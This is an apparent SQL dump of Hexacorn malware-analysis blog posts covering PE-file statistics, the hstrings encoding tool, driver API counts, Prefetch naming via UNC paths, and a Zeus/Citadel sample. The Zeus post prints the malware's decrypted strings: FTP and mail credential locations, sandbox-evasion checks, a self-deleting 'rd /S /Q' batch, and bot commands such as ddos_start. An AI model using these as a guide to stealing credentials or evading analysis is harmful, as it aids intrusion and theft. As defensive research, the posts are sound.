APPDATA 00000000\r\n  (0.18%)      2234    MZ PE i386 APPDATA 56566245\r\n  (0.17%)      2206    MZ PE i386 NullSoft 2.46-5 SIG\r\n  (0.16%)      2078    MZ PE i386 APPDATA 08080000\r\n  (0.16%)      2036    MZ PE i386 DLL COM DEB\r\n  (0.16%)      1990    MZ PE i386 .NET DLL DEB\r\n  (0.14%)      1750    MZ PE i386 APPDATA 001F0023\r\n  (0.14%)      1750    MZ PE i386 APPDATA 5B424547 SIG\r\n  (0.13%)      1706    MZ PE i386 DLL SIG\r\n  (0.13%)      1678    MZ PE i386 NullSoft 2.24\r\n  (0.13%)      1633    MZ PE i386 NullSoft 2.44\r\n  (0.13%)      1597    MZ PE i386 DLL APPDATA 928F8C89\r\n  (0.13%)      1585    MZ PE i386 Wise\r\n  (0.12%)      1582    MZ PE i386 DEB\r\n  (0.12%)      1576    MZ PE i386 DLL APPDATA 861DC8F1\r\n  (0.12%)      1545    MZ PE i386 APPDATA 73676567\r\n  (0.12%)      1537    MZ PE i386 APPDATA 50415443\r\n  (0.12%)      1517    MZ PE i386 APPDATA 5A425245\r\n  (0.11%)      1458    MZ PE i386 APPDATA 60170000 DEB\r\n  (0.11%)      1417    MZ PE i386 DLL Corrupted Tricky DEB\r\n  (0.11%)      1374    MZ PE i386 APPDATA 68480000\r\n  (0.11%)      1367    MZ PE i386 NullSoft 25-Apr-2011.cvs\r\n  (0.11%)      1359    MZ PE i386 APPDATA 3C62696E\r\n  (0.10%)      1288    MZ PE i386 APPDATA 88190000\r\n  (0.10%)      1272    MZ PE i386 APPDATA 980E0000\r\n  (0.10%)      1219    MZ PE i386 APPDATA 6BD6EB2C\r\n  (0.10%)      1213    MZ PE i386 InnoSetup SIG\r\n  (0.09%)      1176    MZ PE i386 InstallShield DEB\r\n  (0.09%)      1174    MZ PE i386 APPDATA 680C0000\r\n  (0.09%)      1159    MZ PE i386 CAB SFX (shifted)\r\n  (0.09%)      1137    MZ PE i386 SYS DLL DEB\r\n  (0.09%)      1122    MZ PE i386 APPDATA 90909090\r\n  (0.09%)      1102    MZ PE i386 APPDATA 00A80000 DEB\r\n  (0.09%)      1091    MZ PE i386 APPDATA 05000000\r\n  (0.09%)      1087    MZ PE i386 .NET DLL\r\n  (0.09%)      1082    MZ PE i386 APPDATA 22A72792\r\n  (0.08%)      1048    MZ PE i386 .NET Corrupted Tricky\r\n  (0.08%)      1043    MZ PE i386 APPDATA C26402DF\r\n  (0.08%)       990    MZ PE i386 Rar SFX (shifted) DEB\r\n  (0.07%)       947    MZ PE i386 APPDATA 3C232440\r\n  (0.07%)       903    MZ PE i386 DLL COM Appended MZ\r\n  (0.07%)       896    MZ PE i386 NullSoft 2.14\r\n  (0.07%)       892    MZ PE i386 Rar SFX (shifted)\r\n  (0.07%)       885    MZ PE i386 APPDATA 0D0A0D0A\r\n  (0.07%)       880    MZ PE i386 SYS DLL\r\n  (0.07%)       877    MZ PE i386 NullSoft 01-Jun-2011.cvs SIG\r\n  (0.07%)       874    MZ PE i386 SmartInstallMaker v.5.02\r\n  (0.06%)       808    MZ PE i386 DLL COM SIG\r\n  (0.06%)       807    MZ PE i386 NullSoft 2.37\r\n  (0.06%)       802    MZ PE i386 ADAEBOOK\r\n  (0.06%)       789    MZ PE i386 APPDATA 78766D00\r\n  (0.06%)       764    MZ PE i386 DLL COM\r\n  (0.06%)       737    MZ PE i386 Install Creator\r\n  (0.06%)       719    MZ PE i386 APPDATA 2A2A2A2A\r\n  (0.06%)       715    MZ PE i386 WebCompiler\r\n  (0.06%)       707    MZ PE i386 APPDATA 00\r\n  (0.05%)       693    MZ PE i386 APPDATA 08001700\r\n  (0.05%)       669    MZ PE i386 APPDATA 00000000 SIG\r\n  (0.05%)       665    MZ PE i386 NullSoft 2.24 SIG\r\n  (0.05%)       656    MZ PE i386 APPDATA 31353836\r\n  (0.05%)       651    MZ PE i386 DLL APPDATA 45474645 DEB\r\n  (0.05%)       628    MZ PE i386 DLL DEB SIG\r\n  (0.05%)       622    MZ PE i386 APPDATA 43434343\r\n  (0.05%)       617    MZ PE i386 APPDATA 34120000\nShare this :)', 'Batch Analysis, Malware Analysis', 'http://www.hexacorn.com/blog/2012/11/19/top-100-malicious-types-of-32-bit-pe-files/\n');
INSERT INTO `Hexacorn` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (330, 'Permanent Link to hstrings (release) – when all strings are attached…', 'Hexacorn', 'November 18, 2012 ', 'In a recent post, I introduced a new tool – hstrings. Its purpose is to find strings of any sort, not only ANSI (ASCII really) and a Basic Latin subset of Unicode, but many encoding variants as well. Today I am releasing a first version of the tool and in this post I will provide more information about currently available options and modes of operations.\nFirst of all, I  encourage you to read Microsoft’s page listing Code Page Identifiers (Windows) – this is a list that I used as a foundation for hstrings; the tool goes a bit further and splits these into multiple families and also tries to split Unicode sets into more manageable chunks, yet Code Page Identifiers are the best starting point to choose what strings one wants to search.\nThe tool works in multiple modes and requires a few options that will decide how the input is processed and how the output is generated, plus what encoding are included in the search.\n\nLet’s see a few examples first…\nCharacter Set recognition\nImagine you have a file that is encoded, but you are not sure what character set is being used for encoding and you have no clue what language it may be at all.\nThe approach one may take to find out more about the file encoding is… a simple brute force which means checking all possible encodings and trying to convert only a small chunk of bytes from the input file to see what happens.\nThis is how ‘probing’ option mode works in hstrings. Once you select the option, the tool will read 32 bytes of the input file and try to decode it using all the chosen encodings and send it to the standard output or to separate files (depends on output options discussed later).\nIn the previous article I presented a sample Russian text encoded with various encodings.\nIf we try to run the hstring over one of these files\nhstrings -qpsC test\\russian_u16be.txt > out\nwe will get the following output:\n\nAs we can see, the longest meaningful string was produced by Unicode Cyrillic. Indeed, the file name contains suffix ‘u16be’ which is how I named the sample file encoded with a 16-bit Unicode Big Endian encoding.\nWe can then try running the same command on the data saved with a different encoding:\nhstrings -qpsC test\\russian_utf8.txt > out\nOf course, this time we are not lucky as the ‘C’ option we used only applies Cyrillic encodings (see option details at the bottom of the post), and the result shows that none of them succeeded:\n\nWe can extend the list – and since it’s just an example we can be greedy – by using all encodings (option ‘0’)\nhstrings -qps0 test\\russian_utf8.txt > out\nBrowsing through results we can see that this time we got the UTF-8 encoding giving quite a good output\n\nIndeed, my naming convention reveals that it is a Russian text saved using UTF8 encoding.\nCertainly, what helps in character set recognition is at least basic knowledge on how texts in various languages look like; anyone who saw Russian text previously shouldn’t have a problem picking up the correct output (encoding) presented in this example, but if you have never seen Cyrillic text before, this can be quite challenging. One way of improving the algorithm I have in mind is adding some wordlists to additionally recognize the known words in a specific language.\nExtracting all strings\nOne aspect of the character set recognition is the actual detection of the matching encoding, now one can simply extract all strings in this encoding from the whole file. You can do it by replacing ‘p’ (probing character set) with ‘d’ (dump strings).\nSince we now know that the last file has been encoded with UTF8, we can extract all strings using ‘8’ options which means UTF8:\nhstrings -qds8 test\\russian_utf8.txt > out\nThe output looks like this:\n\nDue to a number of encodings supported by hstrings, at the moment there is no possibility of specifying a single character set, except for very popular ones and this includes UTF8; I may add option for specific code pages/encodings if there is a demand.\n OPTIONS\nLet’s walk through them one by one\n\nGENERAL OPTIONS:\n\n – q – quiet (no banner) – basically no copyright information\n\n\nINPUT OPTIONS – dictate whether we read the whole input file or just first 32 bytes\n\n– p – probe first 32 bytes of a file\n– d – dump strings from the whole file\n\n\nOUTPUT OPTIONS –provide a choice to save the output in a single file (standard output one can redirect to a file), or multiple files (in such cse file names will have a ‘h_’ prefix and a code page as a name\n\n– s – dump strings to standard output (use pipe to save to file)\n– m – dump strings to multiple files (one encoding=one file)\n\n\nENCODINGS – these are grouped by families\n\n\n– 0 – All supported encodings\n– 1 – All Windows ANSI, UTF8, ASCII subset of Uni-LE/Uni-BE\n– 2 – All Windows ANSI encodings\n– 7 – UTF7\n– 8 – UTF8\n– U – Unicode encodings (except utf8/utf7)\n– I – All IBM encodings\n– E – IBM EBCDIC encodings (subset of I)\n– M – MAC encodings\n– A – Arabic encodings\n– C – Cyrillic encodings\n– H – Hebrew encodings\n– J – Japanese encodings\n– K – Korean encodings\n– Z – Chinese encodings\n\n\n\nFinal word\n\nThis is an experimental tool and it is far from a final – I am personally aware of a few bugs and imperfections that I need to address (e.g. Unicode maps are far from perfect and sometimes produce too much output; generally too much output is still an issue), but if you want to test it feel free and I will appreciate any feedback. Thanks!\nDownload\nYou can download the tool here.\nShare this :)', 'hstrings, Malware Analysis, Software Releases', 'http://www.hexacorn.com/blog/2012/11/18/hstrings-release-when-all-strings-are-attached/\n');
INSERT INTO `Hexacorn` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (331, 'Permanent Link to Random Stats from 24k drivers – APIs', 'Hexacorn', 'November 12, 2012 ', 'Over last few months I have been publishing various stats pulled out of malware collection that I am batch analyzing. The purpose of analysis is not only just getting interesting numbers and utilizing it as a nice filler for the blog  – all this data is being retrieved with a purpose of enhancing HexDive and for my other projects.Until now, I have been presenting data from a superset of all malicious PE files in a collection.  It crossed my mind recently that it would be interesting to focus on a subset of PE files as well and for starters I picked up kernel drivers.\nGetting all strings and then cherrypicking up system functions out of the samples is relatively quick as there is not so many of them – the result of top 100 most popular APIs sorted by number of occurrence is presented below:\n18431    RtlInitUnicodeString\r\n16625    IofCompleteRequest\r\n16214    ExAllocatePoolWithTag\r\n14783    ZwClose\r\n12899    MmGetSystemRoutineAddress\r\n12002    ZwOpenKey\r\n11911    ObfDereferenceObject\r\n11719    IoCreateDevice\r\n11430    IoGetCurrentProcess\r\n11411    ExFreePool\r\n11395    IoDeleteDevice\r\n11198    RtlAnsiStringToUnicodeString\r\n10969    ZwCreateFile\r\n10895    wcslen\r\n10848    strncmp\r\n10672    strncpy\r\n10585    wcscpy\r\n10195    IoCreateSymbolicLink\r\n10141    swprintf\r\n9957    wcscat\r\n9899    PsCreateSystemThread\r\n9495    MmIsAddressValid\r\n9466    ZwSetValueKey\r\n9112    PsLookupProcessByProcessId\r\n9106    ObReferenceObjectByHandle\r\n8971    PsGetVersion\r\n8630    ZwCreateKey\r\n8600    RtlCopyUnicodeString\r\n8334    KeDelayExecutionThread\r\n7925    RtlCompareUnicodeString\r\n7886    wcsncpy\r\n7861    ZwQueryValueKey\r\n7525    KeTickCount\r\n7135    KeQuerySystemTime\r\n7052    IoRegisterDriverReinitialization\r\n6674    PsSetCreateProcessNotifyRoutine\r\n5968    ExFreePoolWithTag\r\n5671    ZwEnumerateKey\r\n5427    ZwQuerySystemInformation\r\n5414    ZwSetInformationFile\r\n5249    ZwDeleteKey\r\n5072    wcsstr\r\n5017    KeWaitForSingleObject\r\n4922    ZwCreateSection\r\n4855    ZwMapViewOfSection\r\n4757    IoDeleteSymbolicLink\r\n4747    PsTerminateSystemThread\r\n4708    wcschr\r\n4605    wcsrchr\r\n4540    KeServiceDescriptorTable\r\n4226    KeQueryTimeIncrement\r\n4218    ZwUnmapViewOfSection\r\n4070    IoDeviceObjectType\r\n3941    ZwReadFile\r\n3740    KeInitializeEvent\r\n3706    KeInitializeTimer\r\n3562    ObQueryNameString\r\n3538    ZwWriteFile\r\n3522    KeSetEvent\r\n3495    DbgPrint\r\n3470    KeGetCurrentIrql\r\n3381    KeBugCheckEx\r\n3313    ZwQueryInformationFile\r\n3286    ZwOpenFile\r\n3232    IoFreeMdl\r\n3171    RtlInitAnsiString\r\n3043    memcpy\r\n3037    IofCallDriver\r\n2897    memset\r\n2892    RtlFreeUnicodeString\r\n2870    IoAllocateMdl\r\n2629    MmProbeAndLockPages\r\n2461    MmUnlockPages\r\n2349    RtlUnicodeStringToAnsiString\r\n2340    ZwAllocateVirtualMemory\r\n2291    IoFreeIrp\r\n2265    MmMapLockedPagesSpecifyCache\r\n2144    KeGetCurrentThread\r\n2134    KfReleaseSpinLock\r\n2090    RtlFreeAnsiString\r\n2031    KeStackAttachProcess\r\n2025    KfRaiseIrql\r\n2022    KfLowerIrql\r\n1997    IoAllocateIrp\r\n1997    ExAllocatePool\r\n1994    RtlCompareMemory\r\n1967    ExGetPreviousMode\r\n1930    RtlTimeToTimeFields\r\n1918    sprintf\r\n1896    KeUnstackDetachProcess\r\n1884    KfAcquireSpinLock\r\n1870    ZwOpenProcess\r\n1808    PsGetCurrentProcessId\r\n1795    KeReleaseMutex\r\n1747    RtlAppendUnicodeToString\r\n1746    KeInitializeSpinLock\r\n1740    IoCreateFile\r\n1729    ProbeForRead\r\n1727    KeClearEvent\r\n1713    RtlUnwind\nShare this :)', 'Batch Analysis, Malware Analysis', 'http://www.hexacorn.com/blog/2012/11/12/random-stats-from-24k-drivers-apis/\n');
INSERT INTO `Hexacorn` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (332, 'Permanent Link to hstrings – when all strings are attached…', 'Hexacorn', 'November 5, 2012 ', 'TL;DR;\na new strings tool that attempts to extract localized strings e.g. French, Chinese from an input file; see example below\nIntro\nTraditional strings utilities are usually limited to ANSI/Unicode-LE/Unicode-BE strings. This is understandable as these are the most prevalent type of strings that we come across in our daily work.  However, many files exist that contain more strings – these we usually miss as they contain accented letters and these break the typical string extraction algorithms. On top of that there are a lot various character encodings out there that make it non-trivial to pick up right bytes in a regular expression or a state machine. One can have accented letters saved as Unicode-LE, Unicode-BE, UTF8, or using one of many legacy encodings e.g. Windows Code Pages or IBM EBCDIC encodings.\nFor quite some time I had in mind an idea to write a smarter strings extraction program that would take this localization/encoding mess into account so even before I released RUStrings I had been already thinking to write something more generic. In other words, I wanted to write a tool that can extract strings from a file in any well-known encoding and language possible.\nAs usual – I didn’t know what trouble I am getting myself into when I began :).\nAs mentioned earlier, there are many encodings used by various platforms and the same string of bytes can be… a random garbage… or it can be  representing a string of characters encoded in one of at least 150 encodings possible including not only legacy encodings, but also Unicode. And not Unicode seen as a subset of characters belonging to ASCII set interleaved by zeros  (‘simplified Unicode’ that string extraction tools rely on), but Unicode that includes blocks dedicated to specific languages and letters e.g. Chinese, Cyrillic, Hangul, etc.\nThe tool I present below attempts to:\n\nread an input file,\nwalk through the file content\napply heuristics and find characters encoded as:\n\nbytes (ANSI and other legacy character sets)\nwords (Unicode LE, Unicode BE, and DBCS)\nbyte sequences (utf-8, utf-7, MBCS – multibyte encodings e.g. iso-2022-jp (Japanese) , GB18030 Simplified Chinese etc.)\n\n\nit then normalizes these code points to Unicode LE\nand appends the strings to an output file for a specific encoding\n\nAt this stage program is in alpha stage as I am still not sure how to present the output properly. Currently the program generates a lot of output files. Way too many. But it is not trivial to make it simpler.\nFrom a data processing perspective it is actually quite a complex problem – since bytes can be interpreted in many ways, the program needs to show all of all the possible strings extracted from a file. The same string of bytes can be easily interpreted as some legacy ANSI code page (actually, simultaneously almost all of them), or as Chinese multibyte encoding – it then needs to normalize the output to unicode, so we have multiple unicode streams coming out of multiple decoders and in the same location of the file. My detection algorithm relies on state machine-like heuristics and it outputs data as it goes through the data. Since the various encoding heuristics are applied at once (one pass through a file), outputting data to a file may cause race conditions and streams from various decoders can start interleaving – leading to a mess. So, currently the output is in different files. I have a few ideas on how to solve, but each has a trade off associated with it, so stay tuned \nOkay, enough babbling and boring theory – let’s look at some example.\nEXAMPLE\nFirst, we need to create a a few text sample files that contain some random text in various languages encoded in many different encodings.\nI generated a few non-sensical lorem-ipsum texts by Lorem Ipsum Generator.\nRussian\nНам аутым убяквюэ нолюёжжэ ад. Нам граэкы компльыктётюр нэ. Квуй видырэр ёнэрмйщ ку, прё ат фиэрэнт элььэефэнд эррорибуз. Ан нам фэюгаят юлламкорпэр интылльэгэбат. Пэр декам квюаэчтио эа, эним витаэ июварыт вэл экз, эа емпэтюсъ элыктрам шэа. Ед съюммо ыльигэнди мэль, ыам эи кхоро кэтэро зальютатуж, одео нюмквуам мэнтётюм эа квуй.\nChinese\n主谷三間機望飼営電時始能快本面一界。約握企曜回金忙出行場説必確天下員週。連芸止嘩健集人説火忘冠率庭泉。田位国以供地紹臣同旅百出済理強波。球告続況時心断主別重並行県邦不康。記悪暮投氏性善治地長中消。小作解共供小田民覧花伝聞団点。止都要空性難改大境新真権軽降真細登皇。読道決集房休講員軟渡慎無告書。社風理載当宿竹金来簡月教。\nGreek\nΙδ φιμ ιλλυδ αλικυαμ συσιπιθ, ετ ηαβεο σανστυς κυι, θεμπορ λυπταθυμ σομπρεχενσαμ μει αν. Υθροκυε νολυισε νες ετ, αδχυς οφφισιις ινφιδυντ αδ σεα. Συ νες λιβρις θιμεαμ. Φιξ μαζιμ λυπταθυμ δελισαθισιμι υθ. Περ υθ πωσε μυνερε.\nLuxembourgish\nAs Fläiß ménger Stieren dat. An och sinn Stret gewalteg, wär am gutt d’Land hinnen, wäit eraus ménger si dee. Feld löschteg mä gei. Fu sou deser Riesen, Blummen löschteg hun jo.\n I then saved these files with different encodings:\n\nRussian: 1251, koi8-R, Unicode-BE, Unicode-LE, UTF8\nChinese: utf8, GB2312, GB18030\nGreek: Unicode-BE, 1253\nLuxembourgish: 1252, Unicode-LE\n\nOnce done, I combined all of the files into one large file – now the sample file contains multiple texts in multiple different languages saved in multiple different character encodings:\n\nRunning htrings over the file produces multiple output files:\n\nYes, it’s quite a lot and reviewing them all is atm an overkill; I have already mentioned that I am still thinking how to improve the presentation layer \nThe rule of a thumb is to start with Windows ANSI code pages, UTF8, Unicode-LE (ULE*) and Unicode-BE (UBE*) and of course cheat – we can go ahead and look at the files associated with the encodings we used in the example above i.e. Russian, Greek, etc. – after all, it’s just an example :):\nPreviewing the result files gives us the following:\n\nh_GB18030,GB18030 Simplified Chinese (4 byte); Chinese Simplified (GB18030)\n\n\n\nh_windows-1253,ANSI Greek; Greek (Windows)\n\n\n\nh_windows-1251,ANSI Cyrillic; Cyrillic (Windows)\n\n\n\nh_windows-1252,ANSI Latin 1; Western European (Windows)\n\n\nSo, it would seem that it works…\n \nI will be releasing the first version of hstrings soon.\nThanks for reading!\nShare this :)', 'Forensic Analysis, hstrings, Malware Analysis, Software Releases', 'http://www.hexacorn.com/blog/2012/11/05/hstrings-when-all-strings-are-attached/\n');
INSERT INTO `Hexacorn` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (333, 'Permanent Link to Prefetch file names and UNC paths', 'Hexacorn', 'October 29, 2012 ', 'In one of the older posts, I talked about how the Prefetch file names are created. Today I was looking at program execution from network shares i.e. originating from the UNC paths and realized that I have not included these in the original article.\nVM Shares\nTo test what happens, I launched WinXP under windbg and put a breakpoint on the hashing function and then executed a test file from a shared VM folder – the screenshot shows the mapping between the drive and the UNC path where the executable is placed:\n\nOnce executed, the windbg popped up and I could trace the full path to a file in a Memory window\nAs it seems, nothing really surprising:\n\nz:\\test.exe is executed\nit is mapped to its UNC path \\\\vmware-host\\Shared Folders\\X\\test.exe\nwhich is then prepended with a device name responsible for HGFS file system (used internally by VM) to form a final string used in a hash calculation\n\\DEVICE\\HGFS\\VMWARE-HOST\\SHARED FOLDERS\\X\\TEST.EXE\n\nReal share\n\nNow, that was the case with a ‘fake’ share created by the VM software.\nWhat about a real share?\nFollowing the same procedure:\n\nI mapped a host \\\\H\\C$ drive as N: inside the guest system with ‘net use’\nand then executed N:\\test.exe\n\nThe result shown below is not very surprising either as now the path refers to LANMANREDIRECTOR:\n\n\n\\DEVICE\\LANMANREDIRECTOR\\H\\C$\\TEST.EXE\n\nSubsted paths\n\nAnd in case you are curious what happens to drives created with subst…\nFor drives mapped locally using ‘subst drive: path’ e.g.\nsubst g: .\nthere is no difference as the device will refer to HARDDISKVOLUME### (where ### is hard drive’s number) – I don’t include screenshot here as I hope this example doesn’t need one.\nHowever, using subst in a slightly different way i.e. referring to target path via localhost’s IP: e.g.\nsubst g: \\\\127.0.0.1\\c$\nwill make the Prefetch file name to be created using the following path:\n\n\n\\DEVICE\\LANMANREDIRECTOR\\127.0.0.1\\C$\\TEST.EXE\n\nAs you can see, each of the test files created a different hash\n\nIn other words, there is plenty of ways to abuse the file naming creation of the prefetch file and it’s quite hard to write an universal hash calculator to cover all these cases – it really depends on the environment and there are lots of tricks to confuse the system + I bet there are a few more that wait to be uncovered.\nShare this :)', 'Anti-Forensics, Forensic Analysis', 'http://www.hexacorn.com/blog/2012/10/29/prefetch-file-names-and-unc-paths/\n');
INSERT INTO `Hexacorn` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (334, 'Permanent Link to Zeus trivia', 'Hexacorn', 'October 26, 2012 ', 'Update\nAfter another chat (with @push_pnx, Thanks!), one more clarification – it appears to be a sample from a Citadel family – a spinoff from Zeus src code that is developed further by most likely a different programming group.\nInterestingly, the distinction between families is not easy as ‘Brian Krebs’ string is often associated with Zeus/Zbot. VirusTotal scan of the sample is associating it with these two as well. Go figure \nUpdate\nAfter I posted this entry Twitter chat with Malware Crusaders ‏@MalwareMustDie (Thanks!) allowed me to fill-in some blanks  + I also did a bit more code analysis myself, so entry below is updated with more details.\nOld post (with updates)\n\nLooking at one of recent Zeus samples I noticed the following:\n\nlots of strings decrypted during runtime – see below\nzeus accepts command line arguments (this has been highlighted previously by Karthik Selvaraj in his 2010 article  A Brief Look at Zeus/Zbot 2.0)\n\n\n\n\n-n – prevents dropper’s self-deletion; this is achieved by not executing the temporary batch file with the following content:\n\n\n\n\n\n\n-z – shows messagebox with a familiar info on Brian Krebs – see screenshot above\n\n\n\n\n\n-v – starts VNC server\n-f – as per Symantec, it alters Registry operations (I am not sure how yet); from the code I see that it introduces a call to Sleep function before a call to hooked GetFileAttributesExW API which is executed with the magic values normally used by a bot builder to communicate with a client\n\n\n\n \nThe original Zeus source code refers to the following command line options:\n\n \n\n-i – provide information about the bot – this option has been changed to -z in a newer version\n-n – don’t remove the dropper\n-f – force update of a client disregarding the bot versions (the delay has been added in a newer version)\n-v – run as VNC\n\nAs it seems, sometimes it’s easier to just read the source code \nStrings decrypted during runtime (good for memory searches – notice info stealing stuff):\n\n“Module: %u\\r\\nType: %s\\r\\nTitle: %s\\r\\nInfo: %s\\r\\n”\n“ERROR”\n“FAILURE”\n“SUCCESS”\n“UNEXPECTED”\n“UNKNOWN”\n“rurl”\n“surl”\n“furl”\n“uid”\n“mask”\n“post”\n“extensions”\n“rules”\n“patterns”\n“%tokenspy%”\n“url”\n“buid”\n“ruid”\n“puid”\n“session”\n“data”\n“get_status”\n“status”\n“status_cache_time”\n“Can’t compile tokenspy rules.”\n“fileName=[%S], fileSize=[%u], fileCRC32=[0x%08X].”\n“set_url”\n“data_before\\r\\n”\n“data_inject\\r\\n”\n“data_after\\r\\n”\n“data_end\\r\\n”\n“%webinject%”\n“Can’t compile webinjects.”\n“fileName=[%S], fileSize=[%u], fileCRC32=[0x%08X], processedInjects=[%u].”\n“Webinjects has been compiled.”\n“result=[%u], fileName=[%S], fileSize=[%u], fileCRC32=[0x%08X], processedInjects=[%u].”\n“*vmware*”\n“*sandbox*”\n“*virtualbox*”\n“*geswall*”\n“*bufferzone*”\n“*safespace*”\n“*.ru”\n“*.con.ua”\n“*.by”\n“*.kz”\n“cmd.exe”\n“powershell.exe”\n“\\r\\nexit\\r\\n”\n“\\r\\nprompt $Q$Q$Q$Q$Q$Q$Q$Q$Q$Q[ $P ]$G\\r\\n”\n“screenshots\\\\%s\\\\%04x_%08x.jpg”\n“unknown”\n“image/jpeg”\n“Software\\\\Microsoft\\\\Windows\\\\Currentversion\\\\Run”\n“SOFTWARE\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\ProfileList\\\\%s”\n“ProfileImagePath”\n“unknown\\\\unknown”\n“:d\\r\\nrd /S /Q \\”%s\\”\\r\\nrd /S /Q \\”%s\\”\\r\\nrd /S /Q \\”%s\\”\\r\\nif exist \\”%s\\” goto d\\r\\nif exist \\”%s\\” goto d\\r\\nif exist \\”%s\\” goto d”\n“videos\\\\%S_%02u_%02u_%02u_(%02u-%02u).webm”\n“grabbed\\\\%S_%02u_%02u_%02u.txt”\n“Grabbed data from: %s\\n\\n%S”\n“%s%s\\nUser-Agent: %S\\nCookie: %S\\nAccept-Language: %S\\nAccept-Encoding: %S\\nScreen(w:h): %u:%u\\nReferer: %S\\nUser input: %s\\n%sPOST data:\\n\\n%S”\n“*EMPTY*”\n“*UNKNOWN*”\n” *BLOCKED*”\n“Content-Type: %s\\r\\n”\n“ZCID: %S\\r\\n”\n“application/x-www-form-urlencoded”\n“HTTP authentication: username=\\”%s\\”, password=\\”%s\\”\\n”\n“HTTP authentication (encoded): %S\\n”\n“%s://%s:%s@%s/”\n“ftp”\n“pop3”\n“anonymous”\n“Software\\\\Microsoft\\\\Internet Explorer\\\\Main”\n“Start Page”\n“Software\\\\Microsoft\\\\Internet Explorer\\\\PhishingFilter”\n“Enabled”\n“EnabledV8”\n“Software\\\\Microsoft\\\\Internet Explorer\\\\Privacy”\n“CleanCookies”\n“Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Internet Settings\\\\Zones\\\\%u”\n“1406”\n“1609”\n“Accept-Encoding: identity\\r\\n”\n“TE:\\r\\n”\n“If-Modified-Since:\\r\\n”\n“\\nPath: %s\\n”\n“%s=%s\\n”\n“*@*.txt”\n“Low”\n“Wininet(Internet Explorer) cookies:\\n%S”\n“Empty”\n“*.sol”\n“Mozilla\\\\Firefox”\n“user.js”\n“profiles.ini”\n“Profile%u”\n“IsRelative”\n“Path”\n“user_pref(\\”network.cookie.cookieBehavior\\”, 0);\\r\\nuser_pref(\\”privacy.clearOnShutdown.cookies\\”, false);\\r\\nuser_pref(\\”security.warn_viewing_mixed\\”, false);\\r\\nuser_pref(\\”security.warn_viewing_mixed.show_once\\”, false);\\r\\nuser_pref(\n“user_pref(\\”browser.startup.homepage\\”, \\”%s\\”);\\r\\nuser_pref(\\”browser.startup.page\\”, 1);\\r\\n”\n“Mozila(Firefox) cookies:\\n\\n%S”\n“Empty”\n“Macromedia\\\\Flash Player”\n“flashplayer.cab”\n“*.sol”\n“Windows Address Book”\n“SOFTWARE\\\\Microsoft\\\\WAB\\\\DLLPath”\n“WABOpen”\n“Windows Contacts”\n“A8000A”\n“1.0”\n“EmailAddressCollection/EmailAddress[%u]/Address”\n“Windows Mail Recipients”\n“Outlook Express Recipients”\n“Outlook Express”\n“account{*}.oeaccount”\n“Software\\\\Microsoft\\\\Windows Mail”\n“Software\\\\Microsoft\\\\Windows Live Mail”\n“Store Root”\n“Salt”\n“0x%s”\n“Windows Mail”\n“Windows Live Mail”\n“MessageAccount”\n“Account_Name”\n“SMTP_Email_Address”\n“%sAccount name: %s\\nE-mail: %s\\n”\n“%s:\\n\\tServer: %s:%u%s\\n\\tUsername: %s\\n\\tPassword: %s\\n”\n“%s_Server”\n“%s_User_Name”\n“%s_Password2”\n“%s_Port”\n“%s_Secure_Connection”\n“SMTP”\n“POP3”\n“IMAP”\n” (SSL)”\n“ftp://%s:%s@%s:%u\\n”\n“ftp://%s:%s@%s\\n”\n“ftp://%S:%S@%S:%u\\n”\n“yA36zA48dEhfrvghGRg57h5UlDv3”\n“sites.dat”\n“quick.dat”\n“history.dat”\n“IP”\n“port”\n“user”\n“pass”\n“SOFTWARE\\\\FlashFXP\\\\3”\n“datafolder”\n“*flashfxp*”\n“FlashFXP”\n“wcx_ftp.ini”\n“connections”\n“default”\n“host”\n“username”\n“password”\n“SOFTWARE\\\\Ghisler\\\\Total Commander”\n“ftpininame”\n“installdir”\n“*totalcmd*”\n“*total*commander*”\n“*ghisler*”\n“Total Commander”\n“ws_ftp.ini”\n“_config_”\n“HOST”\n“PORT”\n“UID”\n“PWD”\n“SOFTWARE\\\\ipswitch\\\\ws_ftp”\n“datadir”\n“*ipswitch*”\n“WS_FTP”\n“*.xml”\n“/*/*/Server”\n“Host”\n“Port”\n“User”\n“Pass”\n“*filezilla*”\n“FileZilla”\n“SOFTWARE\\\\Far\\\\Plugins\\\\ftp\\\\hosts”\n“SOFTWARE\\\\Far2\\\\Plugins\\\\ftp\\\\hosts”\n“hostname”\n“username”\n“user”\n“password”\n“FAR manager”\n“SOFTWARE\\\\martin prikryl\\\\winscp 2\\\\sessions”\n“hostname”\n“portnumber”\n“username”\n“password”\n“WinSCP”\n“ftplist.txt”\n“;server=”\n“;port=”\n“;user=”\n“;password=”\n“ftp*commander*”\n“FTP Commander”\n“SOFTWARE\\\\ftpware\\\\coreftp\\\\sites”\n“host”\n“port”\n“user”\n“pw”\n“CoreFTP”\n“*.xml”\n“FavoriteItem”\n“Host”\n“Port”\n“User”\n“Password”\n“SOFTWARE\\\\smartftp\\\\client 2.0\\\\settings\\\\general\\\\favorites”\n“personal favorites”\n“SOFTWARE\\\\smartftp\\\\client 2.0\\\\settings\\\\backup”\n“folder”\n“SmartFTP”\n“userinit.exe”\n“pass”\n“certs\\\\%s\\\\%s_%02u_%02u_%04u.pfx”\n“grabbed”\n“os_shutdown”\n“os_reboot”\n“url_open”\n“bot_uninstall”\n“bot_update”\n“bot_transfer”\n“dns_filter_add”\n“dns_filter_remove”\n“bot_bc_add”\n“bot_bc_remove”\n“bot_httpinject_disable”\n“bot_httpinject_enable”\n“fs_path_get”\n“fs_search_add”\n“fs_search_remove”\n“user_destroy”\n“user_logoff”\n“user_execute”\n“user_cookies_get”\n“user_cookies_remove”\n“user_certs_get”\n“user_certs_remove”\n“user_url_block”\n“user_url_unblock”\n“user_homepage_set”\n“user_ftpclients_get”\n“user_emailclients_get”\n“user_flashplayer_get”\n“user_flashplayer_remove”\n“module_execute_enable”\n“module_execute_disable”\n“module_download_enable”\n“module_download_disable”\n“info_get_software”\n“info_get_antivirus”\n“info_get_firewall”\n“search_file”\n“upload_file”\n“download_file”\n“ddos_start”\n“ddos_stop”\n“webinjects_update”\n“tokenspy_update”\n“tokenspy_disable”\n“close_browsers”\n“Not enough memory.”\n“Script already executed.”\n“Failed to load local configuration.”\n“Failed to save local 